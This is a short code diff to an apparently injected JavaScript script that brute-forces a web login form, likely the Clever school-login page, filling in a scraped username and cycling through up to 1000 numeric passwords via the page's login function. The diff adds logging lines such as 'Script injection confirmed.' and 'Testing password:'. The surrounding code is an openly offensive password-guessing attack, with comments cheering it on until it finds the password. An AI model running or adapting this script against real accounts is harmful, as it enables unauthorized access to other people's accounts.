@@ -11,6 +11,7 @@ var formPassw = document.getElementById('passwordInput');
 var username = document.getElementById('usernamehack').innerHTML;
 var lastthree = document.getElementById('lastthree').innerHTML;
 //continues until clever screws up, or it finds the password :)
+console.log('Script injection confirmed.');
 var haspassword = false;
 var numbertry = 0;
 var numbertrytostr = null;
@@ -34,6 +35,7 @@ for (let numbertry = 0; numbertry != 1000; numbertry++) {
 		formUsername.value = username;
 		formPassw.value = numbertrytostr;
 		Login.submitLoginRequest(u, e, formUsername.value, formPassw.value);
+		console.log('Testing password:');
 		console.log(passreal);
 	}
 	var timeout = setTimeout(hack, 3000);
